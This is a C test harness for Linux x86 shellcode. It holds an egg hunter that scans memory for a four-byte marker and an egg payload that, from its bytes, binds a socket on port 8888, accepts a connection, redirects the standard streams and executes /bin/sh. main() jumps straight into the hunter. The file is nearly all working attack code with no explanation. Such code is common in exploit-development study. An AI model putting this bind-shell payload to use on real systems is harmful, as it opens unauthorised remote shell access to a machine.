#include <stdio.h>
#include <string.h>
#define EGGD "\x90\x50\x90\x50" //EGG 0x50905090

unsigned char egghunter[] = \
"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c"
"\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75"
"\xec\xaf\x75\xe9\xff\xe7";

unsigned char egg[] = \
EGGD
EGGD
"\x31\xdb\x31\xc0\xb0\x66\xfe\xc3\x56\x6a\x01\x6a"
"\x02\x89\xe1\xcd\x80\x97\x56\x66\x68\x22\xb8\x66"
"\x6a\x02\x89\xe3\x6a\x10\x53\x57\x31\xdb\xf7\xe3"
"\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x56\x57\x31\xdb"
"\xf7\xe3\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x31\xdb"
"\xf7\xe3\x56\x56\x57\xb0\x66\xb3\x05\x89\xe1\xcd"
"\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79"
"\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";
void main()
{
    printf("Egg Hunter Shellcode Length:  %d\n", strlen(egghunter));
    printf("Actual Shellcode Length:  %d\n", strlen(egg));
    int (*ret)() = (int(*)())egghunter;
    ret();
}
